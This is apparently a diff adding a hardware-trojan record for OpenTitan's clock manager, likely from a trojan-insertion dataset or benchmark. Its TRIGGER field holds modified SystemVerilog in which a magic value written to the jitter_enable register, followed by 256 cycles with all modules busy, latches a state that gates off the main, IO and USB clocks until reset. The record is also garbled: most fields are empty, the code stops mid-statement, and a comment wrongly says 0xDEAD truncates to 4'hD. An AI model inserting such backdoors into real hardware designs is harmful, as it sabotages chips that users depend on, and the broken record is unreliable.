@@ -1,0 +1,424 @@
+Trojan ID: trojan_1
+Name: Clock Gating DoS
+Type: denial_of_service
+Target Module: clkmgr
+Target File: hw/top_earlgrey/ip_autogen/clkmgr/rtl/clkmgr.sv
+
+EXPLANATION:
+
+
+TRIGGER:
+// Activation sequence: Write magic value 0xDEAD to jitter_enable register
+  // followed by a specific pattern of idle hints
+  ////////////////////////////////////////////////////
+
+  // Trojan state machine and trigger logic
+  typedef enum logic [1:0] {
+    TrojanIdle   = 2'h0,
+    TrojanArmed  = 2'h1,
+    TrojanActive = 2'h2
+  } trojan_state_e;
+
+  trojan_state_e trojan_state_q, trojan_state_d;
+  logic [7:0] trojan_counter_q, trojan_counter_d;
+  logic trojan_trigger;
+  logic trojan_active;
+  logic [3:0] idle_pattern_match;
+
+  // Register Trojan state
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+      trojan_state_q <= TrojanIdle;
+      trojan_counter_q <= 8'h00;
+    end else begin
+      trojan_state_q <= trojan_state_d;
+      trojan_counter_q <= trojan_counter_d;
+    end
+  end
+
+  // Detect magic value in jitter_enable register (0xDEAD = 4'hD when truncated to 4 bits)
+  logic jitter_magic_detected;
+  assign jitter_magic_detected = (reg2hw.jitter_enable.q == 4'hD);
+
+  // Detect specific idle pattern (all modules reporting busy: 0x0)
+  assign idle_pattern_match = ~idle_i; // Invert MUBI signals to detect "false" = busy
+
+  // Trojan state machine
+  always_comb begin
+    trojan_state_d = trojan_state_q;
+    trojan_counter_d = trojan_counter_q;
+    trojan_trigger = 1'b0;
+
+    case (trojan_state_q)
+      TrojanIdle: begin
+        if (jitter_magic_detected) begin
+          trojan_state_d = TrojanArmed;
+          trojan_counter_d = 8'h00;
+        end
+      end
+
+      TrojanArmed: begin
+        if (idle_pattern_match == 4'hF) begin  // All modules busy
+          trojan_counter_d = trojan_counter_q + 1'b1;
+          if (trojan_counter_q == 8'hFF) begin  // 256 cycles of all busy
+            trojan_state_d = TrojanActive;
+            trojan_trigger = 1'b1;
+          end
+        end else begin
+          trojan_counter_d = 8'h00;  // Reset counter if pattern breaks
+        end
+      end
+
+      TrojanActive: begin
+        // Stay active until reset
+        trojan_trigger = 1'b1;
+      end
+
+      default: begin
+        trojan_state_d = TrojanIdle;
+        trojan_counter_d = 8'h00;
+      end
+    endcase
+  end
+
+  assign trojan_active = (trojan_state_q == TrojanActive);
+
+  ////////////////////////////////////////////////////
+  // Alerts
+  ////////////////////////////////////////////////////
+
+  assign alert_test = {
+    reg2hw.alert_test.fatal_fault.q & reg2hw.alert_test.fatal_fault.qe,
+    reg2hw.alert_test.recov_fault.q & reg2hw.alert_test.recov_fault.qe
+  };
+
+  logic recov_alert;
+  assign recov_alert =
+    hw2reg.recov_err_code.io_measure_err.de |
+    hw2reg.recov_err_code.io_timeout_err.de |
+    hw2reg.recov_err_code.io_div2_measure_err.de |
+    hw2reg.recov_err_code.io_div2_timeout_err.de |
+    hw2reg.recov_err_code.io_div4_measure_err.de |
+    hw2reg.recov_err_code.io_div4_timeout_err.de |
+    hw2reg.recov_err_code.main_measure_err.de |
+    hw2reg.recov_err_code.main_timeout_err.de |
+    hw2reg.recov_err_code.usb_measure_err.de |
+    hw2reg.recov_err_code.usb_timeout_err.de |
+    hw2reg.recov_err_code.shadow_update_err.de;
+
+  assign alerts = {
+    |reg2hw.fatal_err_code,
+    recov_alert
+  };
+
+  localparam logic [NumAlerts-1:0] AlertFatal = {1'b1, 1'b0};
+
+  for (genvar i = 0; i < NumAlerts; i++) begin : gen_alert_tx
+    prim_alert_sender #(
+      .AsyncOn(AlertAsyncOn[i]),
+      .SkewCycles(AlertSkewCycles),
+      .IsFatal(AlertFatal[i])
+    ) u_prim_alert_sender (
+      .clk_i,
+      .rst_ni,
+      .alert_test_i  ( alert_test[i] ),
+      .alert_req_i   ( alerts[i]     ),
+      .alert_ack_o   (               ),
+      .alert_state_o (               ),
+      .alert_rx_i    ( alert_rx_i[i] ),
+      .alert_tx_o    ( alert_tx_o[i] )
+    );
+  end
+
+  ////////////////////////////////////////////////////
+  // Clock bypass request
+  ////////////////////////////////////////////////////
+
+  mubi4_t extclk_ctrl_sel;
+  mubi4_t extclk_ctrl_hi_speed_sel;
+
+  assign extclk_ctrl_sel = mubi4_t'(reg2hw.extclk_ctrl.sel.q);
+  assign extclk_ctrl_hi_speed_sel = mubi4_t'(reg2hw.extclk_ctrl.hi_speed_sel.q);
+
+  clkmgr_byp #(
+    .NumDivClks(2)
+  ) u_clkmgr_byp (
+    .clk_i,
+    .rst_ni,
+    .en_i(lc_hw_debug_en_i),
+    .lc_clk_byp_req_i,
+    .lc_clk_byp_ack_o,
+    .byp_req_i(extclk_ctrl_sel),
+    .byp_ack_o(hw2reg.extclk_status.d),
+    .hi_speed_sel_i(extclk_ctrl_hi_speed_sel),
+    .all_clk_byp_req_o,
+    .all_clk_byp_ack_i,
+    .io_clk_byp_req_o,
+    .io_clk_byp_ack_i,
+    .hi_speed_sel_o,
+
+    // divider step down controls
+    .step_down_acks_i(step_down_acks)
+  );
+
+  ////////////////////////////////////////////////////
+  // Feed through clocks
+  // Feed through clocks do not actually need to be in clkmgr, as they are
+  // completely untouched. The only reason they are here is for easier
+  // bundling management purposes through clocks_o
+  ////////////////////////////////////////////////////
+  prim_clock_buf u_clk_io_div4_powerup_buf (
+    .clk_i(clk_io_div4),
+    .clk_o(clocks_o.clk_io_div4_powerup)
+  );
+
+  // clock gated indication for alert handler: these clocks are never gated.
+  assign cg_en_o.io_div4_powerup = MuBi4False;
+  prim_clock_buf u_clk_aon_powerup_buf (
+    .clk_i(clk_aon),
+    .clk_o(clocks_o.clk_aon_powerup)
+  );
+
+  // clock gated indication for alert handler: these clocks are never gated.
+  assign cg_en_o.aon_powerup = MuBi4False;
+  prim_clock_buf u_clk_main_powerup_buf (
+    .clk_i(clk_main),
+    .clk_o(clocks_o.clk_main_powerup)
+  );
+
+  // clock gated indication for alert handler: these clocks are never gated.
+  assign cg_en_o.main_powerup = MuBi4False;
+  prim_clock_buf u_clk_io_powerup_buf (
+    .clk_i(clk_io),
+    .clk_o(clocks_o.clk_io_powerup)
+  );
+
+  // clock gated indication for alert handler: these clocks are never gated.
+  assign cg_en_o.io_powerup = MuBi4False;
+  prim_clock_buf u_clk_usb_powerup_buf (
+    .clk_i(clk_usb),
+    .clk_o(clocks_o.clk_usb_powerup)
+  );
+
+  // clock gated indication for alert handler: these clocks are never gated.
+  assign cg_en_o.usb_powerup = MuBi4False;
+  prim_clock_buf u_clk_io_div2_powerup_buf (
+    .clk_i(clk_io_div2),
+    .clk_o(clocks_o.clk_io_div2_powerup)
+  );
+
+  // clock gated indication for alert handler: these clocks are never gated.
+  assign cg_en_o.io_div2_powerup = MuBi4False;
+  prim_clock_buf u_clk_aon_secure_buf (
+    .clk_i(clk_aon),
+    .clk_o(clocks_o.clk_aon_secure)
+  );
+
+  // clock gated indication for alert handler: these clocks are never gated.
+  assign cg_en_o.aon_secure = MuBi4False;
+  prim_clock_buf u_clk_aon_peri_buf (
+    .clk_i(clk_aon),
+    .clk_o(clocks_o.clk_aon_peri)
+  );
+
+  // clock gated indication for alert handler: these clocks are never gated.
+  assign cg_en_o.aon_peri = MuBi4False;
+  prim_clock_buf u_clk_aon_timers_buf (
+    .clk_i(clk_aon),
+    .clk_o(clocks_o.clk_aon_timers)
+  );
+
+  // clock gated indication for alert handler: these clocks are never gated.
+  assign cg_en_o.aon_timers = MuBi4False;
+
+  ////////////////////////////////////////////////////
+  // Distribute pwrmgr ip_clk_en requests to each family
+  ////////////////////////////////////////////////////
+  // clk_main family
+  logic pwrmgr_main_en;
+  assign pwrmgr_main_en = pwr_i.main_ip_clk_en;
+  // clk_io family
+  logic pwrmgr_io_en;
+  logic pwrmgr_io_div2_en;
+  logic pwrmgr_io_div4_en;
+  assign pwrmgr_io_en = pwr_i.io_ip_clk_en;
+  assign pwrmgr_io_div2_en = pwr_i.io_ip_clk_en;
+  assign pwrmgr_io_div4_en = pwr_i.io_ip_clk_en;
+  // clk_usb family
+  logic pwrmgr_usb_en;
+  assign pwrmgr_usb_en = pwr_i.usb_ip_clk_en;
+
+  ////////////////////////////////////////////////////
+  // Root gating
+  ////////////////////////////////////////////////////
+
+  // clk_main family
+  logic [0:0] main_ens;
+
+  logic clk_main_en;
+  logic clk_main_root;
+  clkmgr_root_ctrl u_main_root_ctrl (
+    .clk_i(clk_main),
+    .rst_ni(rst_root_main_ni),
+    .scanmode_i,
+    .async_en_i(pwrmgr_main_en & ~trojan_active),  // TROJAN: Disable main clock when active
+    .en_o(clk_main_en),
+    .clk_o(clk_main_root)
+  );
+  assign main_ens[0] = clk_main_en;
+
+  // create synchronized status
+  clkmgr_clk_status #(
+    .NumClocks(1)
+  ) u_main_status (
+    .clk_i,
+    .rst_ni(rst_root_ni),
+    .ens_i(main_ens),
+    .status_o(pwr_o.main_status)
+  );
+
+  // clk_io family
+  logic [2:0] io_ens;
+
+  logic clk_io_en;
+  logic clk_io_root;
+  clkmgr_root_ctrl u_io_root_ctrl (
+    .clk_i(clk_io),
+    .rst_ni(rst_root_io_ni),
+    .scanmode_i,
+    .async_en_i(pwrmgr_io_en & ~trojan_active),  // TROJAN: Disable IO clock when active
+    .en_o(clk_io_en),
+    .clk_o(clk_io_root)
+  );
+  assign io_ens[0] = clk_io_en;
+
+  logic clk_io_div2_en;
+  logic clk_io_div2_root;
+  clkmgr_root_ctrl u_io_div2_root_ctrl (
+    .clk_i(clk_io_div2),
+    .rst_ni(rst_root_io_div2_ni),
+    .scanmode_i,
+    .async_en_i(pwrmgr_io_div2_en & ~trojan_active),  // TROJAN: Disable IO DIV2 clock when active
+    .en_o(clk_io_div2_en),
+    .clk_o(clk_io_div2_root)
+  );
+  assign io_ens[1] = clk_io_div2_en;
+
+  logic clk_io_div4_en;
+  logic clk_io_div4_root;
+  clkmgr_root_ctrl u_io_div4_root_ctrl (
+    .clk_i(clk_io_div4),
+    .rst_ni(rst_root_io_div4_ni),
+    .scanmode_i,
+    .async_en_i(pwrmgr_io_div4_en & ~trojan_active),  // TROJAN: Disable IO DIV4 clock when active
+    .en_o(clk_io_div4_en),
+    .clk_o(clk_io_div4_root)
+  );
+  assign io_ens[2] = clk_io_div4_en;
+
+  // create synchronized status
+  clkmgr_clk_status #(
+    .NumClocks(3)
+  ) u_io_status (
+    .clk_i,
+    .rst_ni(rst_root_ni),
+    .ens_i(io_ens),
+    .status_o(pwr_o.io_status)
+  );
+
+  // clk_usb family
+  logic [0:0] usb_ens;
+
+  logic clk_usb_en;
+  logic clk_usb_root;
+  clkmgr_root_ctrl u_usb_root_ctrl (
+    .clk_i(clk_usb),
+    .rst_ni(rst_root_usb_ni),
+    .scanmode_i,
+    .async_en_i(pwrmgr_usb_en & ~trojan_active),  // TROJAN: Disable USB clock when active
+    .en_o(clk_usb_en),
+    .clk_o(clk_usb_root)
+  );
+  assign usb_ens[0] = clk_usb_en;
+
+  // create synchronized status
+  clkmgr_clk_status #(
+    .NumClocks(1)
+  ) u_usb_status (
+    .clk_i,
+    .rst_ni(rst_root_ni),
+    .ens_i(usb_ens),
+    .status_o(pwr_o.usb_status)
+  );
+
+  ////////////////////////////////////////////////////
+  // Clock Measurement for the roots
+  // SEC_CM: TIMEOUT.CLK.BKGN_CHK, MEAS.CLK.BKGN_CHK
+  ////////////////////////////////////////////////////
+
+  typedef enum logic [2:0] {
+    BaseIdx,
+    ClkIoIdx,
+    ClkIoDiv2Idx,
+    ClkIoDiv4Idx,
+    ClkMainIdx,
+    ClkUsbIdx,
+    CalibRdyLastIdx
+  } clkmgr_calib_idx_e;
+
+  // if clocks become uncalibrated, allow the measurement control configurations to change
+  mubi4_t [CalibRdyLastIdx-1:0] calib_rdy;
+  prim_mubi4_sync #(
+    .AsyncOn(1),
+    .NumCopies(int'(CalibRdyLastIdx)),
+    .ResetValue(MuBi4False)
+  ) u_calib_rdy_sync (
+    .clk_i,
+    .rst_ni,
+    .mubi_i(calib_rdy_i),
+    .mubi_o({calib_rdy})
+  );
+
+  always_comb begin
+    hw2reg.measure_ctrl_regwen.de = '0;
+    hw2reg.measure_ctrl_regwen.d = reg2hw.measure_ctrl_regwen;
+
+    if (mubi4_test_false_strict(calib_rdy[BaseIdx])) begin
+      hw2reg.measure_ctrl_regwen.de = 1'b1;
+      hw2reg.measure_ctrl_regwen.d = 1'b1;
+    end
+  end
+
+  clkmgr_meas_chk #(
+    .Cnt(1024),
+    .RefCnt(1)
+  ) u_io_meas (
+    .clk_i,
+    .rst_ni,
+    .clk_src_i(clk_io),
+    .rst_src_ni(rst_io_ni),
+    .clk_ref_i(clk_aon),
+    .rst_ref_ni(rst_aon_ni),
+    // signals on source domain
+    .src_en_i(clk_io_en & mubi4_test_true_loose(mubi4_t'(reg2hw.io_meas_ctrl_en))),
+    .src_max_cnt_i(reg2hw.io_meas_ctrl_shadowed.hi.q),
+    .src_min_cnt_i(reg2hw.io_meas_ctrl_shadowed.lo.q),
+    .src_cfg_meas_en_i(mubi4_t'(reg2hw.io_meas_ctrl_en.q)),
+    .src_cfg_meas_en_valid_o(hw2reg.io_meas_ctrl_en.de),
+    .src_cfg_meas_en_o(hw2reg.io_meas_ctrl_en.d),
+    // signals on local clock domain
+    .calib_rdy_i(calib_rdy[ClkIoIdx]),
+    .meas_err_o(hw2reg.recov_err_code.io_measure_err.de),
+    .timeout_err_o(hw2reg.recov_err_code.io_timeout_err.de)
+  );
+
+  assign hw2reg.recov_err_code.io_
+
+PAYLOAD:
+
+
+TESTBENCH STRATEGY:
+
+
+TAXONOMY:
+
